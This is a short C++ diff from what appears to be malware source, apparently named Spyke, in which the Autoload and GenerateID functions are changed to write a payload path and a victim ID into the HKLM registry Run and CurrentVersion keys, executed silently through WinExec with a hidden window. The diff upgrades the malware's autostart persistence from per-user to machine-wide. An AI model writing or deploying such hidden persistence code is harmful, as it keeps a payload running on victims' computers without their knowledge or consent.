@@ -40,7 +40,9 @@ void Utils::Autoload()
 	string Name = "foobar", Path = "%PROCESSOR_LEVEL%";
 	// HERE Path == \\Temp\\Spyke.exe, save payload to this file
 
-	string commandAuto = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V " + Name + " /t REG_SZ /F /D \"" + Path + "\"";
+	//string commandAuto = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V " + Name + " /t REG_SZ /F /D \"" + Path + "\"";
+	string commandAuto = "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V " + Name + " /t REG_SZ /F /D \"" + Path + "\"";
+
 	//system(commandAuto.c_str());
 	WinExec(commandAuto.c_str(), SW_HIDE);
 }
@@ -49,7 +51,9 @@ void Utils::GenerateID()
 {
 	hash<long long> h;
 	sprintf_s(ID, sizeof(ID), "%u", h(time(NULL)));
-	string commandID = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion /V ID /t REG_SZ /F /D \"" + string(ID) + "\"";
+	//string commandID = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion /V ID /t REG_SZ /F /D \"" + string(ID) + "\"";
+	string commandID = "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion /V ID /t REG_SZ /F /D \"" + string(ID) + "\"";
+
 	//system(commandID.c_str());
 	WinExec(commandID.c_str(), SW_HIDE);
 }
